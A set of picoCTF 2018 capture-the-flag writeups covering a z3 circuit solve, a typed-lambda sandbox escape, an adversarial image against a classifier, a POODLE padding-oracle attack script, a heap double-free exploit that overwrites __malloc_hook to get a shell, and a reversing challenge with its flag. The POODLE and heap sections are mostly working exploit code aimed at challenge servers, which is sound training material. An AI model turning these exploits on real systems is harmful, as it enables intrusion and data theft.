# Stallman's Recycle Plant - Selected Writeups

## circuit123

I lost my source for this because I did this entirely in browser, but I still have some of the intermediate files saved.

So, I just started out and I wrote a python script to parse the input file, translating every requirement from the input file into a z3 input file, as follows

```scheme
(declare-const b (Array Int Bool))
(assert (= (select b 1140) false))
(assert (= (select b 128) true))
(assert (= (select b 129) (xor (xor (select b 0) false) (xor (select b 64) false))))
(assert (= (select b 130) (xor (xor (select b 129) false) (xor (select b 128) true))))
(assert (= (select b 131) (or (xor (select b 64) true) (xor (select b 128) false))))
(assert (= (select b 132) (or (xor (select b 0) true) (xor (select b 128) false))))
(assert (= (select b 133) (or (xor (select b 131) true) (xor (select b 132) true))))
(assert (= (select b 134) (or (xor (select b 0) true) (xor (select b 64) true))))
(assert (= (select b 135) (or (xor (select b 133) false) (xor (select b 134) true))))
...
(assert (= (select b 1137) (or (xor (select b 1129) false) (xor (select b 1136) false))))
(assert (= (select b 1138) (or (xor (select b 1122) false) (xor (select b 1137) false))))
(assert (= (select b 1139) (or (xor (select b 1107) false) (xor (select b 1138) false))))
(assert (= (select b 1140) (or (xor (select b 1076) false) (xor (select b 1139) false))))
(check-sat)
(get-model)
(get-value (b))
```

Then I ran z3 on it, copied the output into another file, and made another python script to parse that (format of the output is below), then return what the original input to the program should be.

```scheme
(ite (= x!1 319) false
(ite (= x!1 623) true
(ite (= x!1 851) false
(ite (= x!1 857) false
(ite (= x!1 46) false
(ite (= x!1 313) false
(ite (= x!1 946) true
(ite (= x!1 821) true
(ite (= x!1 569) false
(ite (= x!1 456) true
(ite (= x!1 578) true
(ite (= x!1 641) true
(ite (= x!1 324) true
(ite (= x!1 198) true
(ite (= x!1 633) false
(ite (= x!1 994) false
(ite (= x!1 1096) false
(ite (= x!1 781) true
(ite (= x!1 93) false
(ite (= x!1 1012) true
```


## lambdash

Fun one.

Basically, first step was finding that there was a local file inclusion, so going to package.json gave me a list of important files.

From there, it was just staring at the code for a while, until I found how to use the limited functionality present in the emulator to create a string via doing Function.toString.name.constructor.fromCharCode(), and just using the addition present in the emulator to concat the chars together.  Then it was just running Function.constructor("return hidden.getFlag('that string that was in the source')")(null) through the emulator.  The only issue that remained was getting it to typecheck, but the typechecker bug was so generously pointed out to us that al that was really necessary was making a function a recursive type, so that i could override the type of that function to an object with the exact properties we watned such that all of the functions/properties typechecked.  Ran it, it worked, gucci gang.

```
alias m = int -> unit -> int in
alias b = {`constructor m} in
alias t = {`toString {`name {`constructor {`fromCharCode (int -> int)}}}} in
alias q = rec r. (unit -> r) in
(lambda x:(int -> int). lambda y:m.y (x 114 + x 101 + x 116 + x 117 + x 114 + x 110 + x 32 + x 104 + x 105 + x 100 + x 100 + x 101 + x 110 + x 46 + x 103 + x 101 + x 116 + x 70 + x 108 + x 97 + x 103 + x 40 + x 34 + x 105 + x 102 + x 32 + x 121 + x 111 + x 117 + x 32 + x 99 + x 97 + x 110 + x 32 + x 103 + x 101 + x 116 + x 32 + x 116 + x 104 + x 105 + x 115 + x 32 + x 121 + x 111 + x 117 + x 32 + x 100 + x 101 + x 115 + x 101 + x 114 + x 118 + x 101 + x 32 + x 116 + x 104 + x 101 + x 32 + x 102 + x 108 + x 97 + x 103 + x 32 + x 45 + x 62 + x 32 + x 97 + x 98 + x 99 + x 100 + x 49 + x 50 + x 51 + x 52 + x 33 + x 64 + x 35 + x 36 + x 37 + x 94 + x 38 + x 42 + x 40 + x 41 + x 39 + x 34 + x 41) ())


(((unfold ((lambda x:(unit -> q). (LAMBDA r. x ()) [t])
(fix f x:unit returns q. fold as q (lambda a:unit. f x)))) ())#`toString#`name#`constructor#`fromCharCode)

(((unfold ((lambda x:(unit -> q). (LAMBDA r. x ()) [b])
(fix f x:unit returns q. fold as q (lambda a:unit. f x)))) ())#`constructor)
```

## dogorfrog

I just took code off of a medium post that shows up as the first result when you google search "tricking machine learning" and slightly modified it to fit this problem via changing the source of the model and the image dimensions.

```python
# Taken from some medium post
import numpy as np
from keras.preprocessing import image
from keras.applications import inception_v3
from keras.applications.mobilenet import decode_predictions, preprocess_input
from keras.models import load_model
from keras import backend as K
from PIL import Image

# Load pre-trained image recognition model
model = load_model("model.h5")

# Grab a reference to the first and last layer of the neural net
model_input_layer = model.layers[0].input
model_output_layer = model.layers[-1].output

# Choose an ImageNet object to fake
# The list of classes is available here: https://gist.github.com/ageitgey/4e1342c10a71981d0b491e1b8227328b
# Class #859 is "toaster"
object_type_to_fake = 31

# Load the image to hack
img = image.load_img("img/trixi.png", target_size=(224, 224))
img.convert("RGB")
original_image = image.img_to_array(img)

# Scale the image so all pixel intensities are between [-1, 1] as the model expects
#original_image /= 255.
#original_image -= 0.5
#original_image *= 2.

# Add a 4th dimension for batch size (as Keras expects)
original_image = np.expand_dims(original_image, axis=0)
print(original_image)
original_image = preprocess_input(original_image)
print(original_image)

# Pre-calculate the maximum change we will allow to the image
# We'll make sure our hacked image never goes past this so it doesn't look funny.
# A larger number produces an image faster but risks more distortion.
max_change_above = original_image + 0.01
max_change_below = original_image - 0.01

# Create a copy of the input image to hack on
hacked_image = np.copy(original_image)

# How much to update the hacked image in each iteration
learning_rate = 0.05

# Define the cost function.
# Our 'cost' will be the likelihood out image is the target class according to the pre-trained model
cost_function = model_output_layer[0, object_type_to_fake]

# We'll ask Keras to calculate the gradient based on the input image and the currently predicted class
# In this case, referring to "model_input_layer" will give us back image we are hacking.
gradient_function = K.gradients(cost_function, model_input_layer)[0]

# Create a Keras function that we can call to calculate the current cost and gradient
grab_cost_and_gradients_from_model = K.function([model_input_layer, K.learning_phase()], [cost_function, gradient_function])

cost = 0.0

# In a loop, keep adjusting the hacked image slightly so that it tricks the model more and more
# until it gets to at least 80% confidence
while cost < 0.99:
    # Check how close the image is to our target class and grab the gradients we
    # can use to push it one more step in that direction.
    # Note: It's really important to pass in '0' for the Keras learning mode here!
    # Keras layers behave differently in prediction vs. train modes!
    cost, gradients = grab_cost_and_gradients_from_model([hacked_image, 0])
    print(filter(lambda x: u"frog" in x[1],decode_predictions(model.predict(hacked_image, verbose=1), top=10000)[0]))
    if cost > 0.99: break

    # Move the hacked image one step further towards fooling the model
    hacked_image += gradients * (learning_rate / cost)

    # Ensure that the image doesn't ever change too much to either look funny or to become an invalid image
    hacked_image = np.clip(hacked_image, max_change_below, max_change_above)
    hacked_image = np.clip(hacked_image, -1,1)

    print("Model's predicted likelihood that the image is a toaster: {:.8}%".format(cost * 100))

# De-scale the image's pixels from [-1, 1] back to the [0, 255] range
print(hacked_image)
img = hacked_image[0]

img += 1
img *= 255/2

# Save the hacked image!
im = Image.fromarray(img.astype(np.uint8))
im.save("hacked-image.png")
```

## James Brahm Returns

I just took even more code off of the internet except this time I googled "SSL3 exploit" then "POODLE exploit python", then I just modified the padding and encryption oracle functions.

```python
import io
import time
import subprocess
import random

random.seed()


def gen_nc():
	print("Generating netcat")
	time.sleep(1)
	global nc
	nc = subprocess.Popen("nc 2018shell2.picoctf.com 37440", shell=True,
		stdin=subprocess.PIPE, stdout=subprocess.PIPE)
	nc.stdout.readline()

gen_nc()

def encrypt_oracle(sitrep, last):
	while True:
		try:
			nc.stdout.readline()
			nc.stdout.readline()
			nc.stdout.readline()
			nc.stdin.write(b'E\n'+sitrep+b'\n'+last+b'\n')
			nc.stdin.flush()
			result = nc.stdout.readline()[62:-1]
			return bytes.fromhex(result.decode('utf-8'))
			break
		except: gen_nc()

def mac_oracle(data):
	while True:
		try:
			nc.stdout.readline()
			nc.stdout.readline()
			nc.stdout.readline()
			# data = bytes([random.randrange(256) for _ in range(16)]) + data
			nc.stdin.write(bytes('S\n'+data.hex()+'\n','utf-8'))
			nc.stdin.flush()
			result = nc.stdout.readline()
			#print(result)
			break
		except: gen_nc()
	return b'Successful decryption.' in result

print(mac_oracle(encrypt_oracle(b"$$$$$$$",b"asdgasdhgj")))

secret = encrypt_oracle(b"", b"")

save = 0
while True:
	if len(encrypt_oracle(b"a"*save,b"")) > len(secret):
		break
	save += 1

dec = []

for block in range(16,len(secret)-16,16)[::-1]:
	for b in range(16):
		print(dec)
		count = 0
		while True:
			count += 1
			request = list(encrypt_oracle(b"$"*16+b"#"*(save+b),b"%"*(block-b)))
			request[-16:] = request[block:block+16]
			if mac_oracle(bytes(request)):
				pbn = request[-32:-16]
				pbi = request[block-16:block]
				decb = 16 ^ pbn[-1] ^ pbi[-1]
				print("got byte {}".format(decb))
				dec += [decb]
				break
	print("".join([chr(x) for x in dec[::-1]]))
print(dec)
```

## cake

Another fun one

It was basically down to finding that make computes the second write address after writing the first address.  The exploit first used  a simple double free to get a malloc pointer to the start of the list in order to set up an fd pointer for later.  Then one more double free to write 0s to a place where I could make a write to to set it up such that I can utilize the address computation (and to read libc with this write).  Lastly I did another write that goes to the fd pointer set up earlier that actually does the write of a one gadget to `__malloc_hook`, and then another make to get a malloc to run to get shell. All this time I was getting malloc to return pointers at the start of the list so that I could modify the money/customers so the size check would pass.

```python
#!/usr/bin/env python

from pwn import *
import time

pico = 1

if pico:
	r = remote('2018shell2.picoctf.com', 36903)
else:
	env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./pico32.libc.so.6")}
	r = process("./cake")

time.sleep(3)
r.recv()

def make(name, cost):
    r.sendline('M')
    time.sleep(1)
    r.recv()
    r.sendline(name)
    time.sleep(0.1)
    r.recv()
    r.sendline(str(cost))
    time.sleep(0.1)
    r.recv()

def inspect(num):
    r.sendline('I')
    time.sleep(0.1)
    r.recv()
    r.sendline(str(num))
    time.sleep(0.1)
    ret = r.recvline()
    r.recv()
    return int(ret[20:-1])

def serve(num):
    r.sendline('S')
    time.sleep(0.1)
    r.recv()
    r.sendline(str(num))
    time.sleep(0.1)
    return r.recv()

libc = ELF('./pico32.libc.so.6')
GOT_STRCHR = 0x603040

make("0",0) # id 0
make("1",33) # id 1
make("2",0) # id 2
serve(0)
serve(1)
serve(0)
make("1",0x6030d8) # id 3
make("2",0) # id 4
make("3",0) # id 5
make(p64(0x6030d8), 34) # id 6
serve(3)
serve(4)
serve(3)
make("1", 0x6030e0) # id 7
make("2", 0) # id 8
make("3", 0) # id 9
make(p64(GOT_STRCHR), 0)
LIBC_STRCHR = inspect(1)
LIBC_BASE = LIBC_STRCHR - libc.symbols['strchr'] - 0x30
LIBC_MALLOC_HOOK = LIBC_BASE + libc.symbols['__malloc_hook']
print(hex(LIBC_MALLOC_HOOK))
LIBC_ONE = LIBC_BASE + 0x4526a
make(p64(LIBC_MALLOC_HOOK).replace('\x00',''), LIBC_ONE)

r.interactive()
```

## be-quick-or-be-dead-3

Firstly, in order to debug the program easier, I `NOP`'d out the call to `set_timer` using Radare's `-w` mode. This challenge is very similar to be-quick-or-be-dead-2, where instead of generating plain Fibonacci numbers as the key for decryption, it generates numbers from a sort of modified Fibonacci. 
You can see this in Hopper's pseudocode:
```C
#called with 0x18f4b
int calc(int arg0) {
    var_24 = arg0;
    if (var_24 <= 0x4) {
            var_14 = var_24 * var_24 + 0x2345;
    }
    else {
            var_14 = calc(var_24 - 0x5) * 0x1234 + (calc(var_24 - 0x1) - calc(var_24 - 0x2)) + (calc(var_24 - 0x3) - calc(var_24 - 0x4));
    }
    rax = var_14;
    return rax;
}
```
I then replicated this as python code:
```python
a = 0x18f4b  
def f(x):  
	if x <= 4: 
		return x * x + 0x2345  
	return f(x - 0x5) * 0x1234 + f(x-1) - f(x-2) + f(x-3) - f(x-4) 
f(a)
```
The value of `a` is way too large for the answer to be found with regular recursion, so I optimized the recursive function with dynamic programming, like so:
```python
a = 0x18f4b
memo = {}

def g(x):
	if x in memo:
		return memo[x]
	if x <= 4:
		res = x * x + 0x2345
	else:
		res = g(x-5) * 0x1234 + g(x-1) - g(x-2) + g(x-3) - g(x-4)
	memo[x] = res
	return res
		
#populate memo to avoid reaching max recursion depth
for i in range(a):
	g(i)
#"casting" to 32 bit integer
print(ctypes.c_uint32(g(a)).value)
#797760575
```
It is important to note that you have to populate the `memo` dictionary as just a call to `g(a)` would reach Python's max recursion limit.  Once this value was found, using radare2, I jumped over the call to `calculate_key` by setting `rip` with `dr`. Then, I set `eax` equal to the value found, which was then copied into `obj.key`. Continuing program execution with `dc`, the flag was printed out:

`picoCTF{dynamic_pr0gramming_ftw_22ac7d81}`

## freecalc

Unsolved while the competition was running.
